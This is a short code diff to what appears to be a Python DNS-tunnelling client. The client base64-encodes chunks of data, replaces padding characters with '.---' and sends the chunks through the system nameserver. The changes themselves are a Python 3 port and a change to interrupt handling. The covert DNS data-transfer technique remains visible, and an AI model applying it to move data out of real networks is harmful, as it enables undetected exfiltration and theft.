@@ -33,8 +33,7 @@ class Client:
         nameserver = resolver_object.nameservers[0]
 
         while byte_reader < len(data_to_transmit) + self.length:
-            encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
-            encoded_data = encoded_data.replace("=", ".---")
+            encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length]).decode('ascii').replace("=", ".---")
 
             # calcalate total packets
             if (len(data_to_transmit) % self.length) == 0:
@@ -52,8 +51,7 @@ class Client:
             except socket.gaierror:
                 pass
             except KeyboardInterrupt:
-                print('[*] Shutting down...')
-                sys.exit()
+                raise
 
             # Increment counters
             byte_reader += self.length
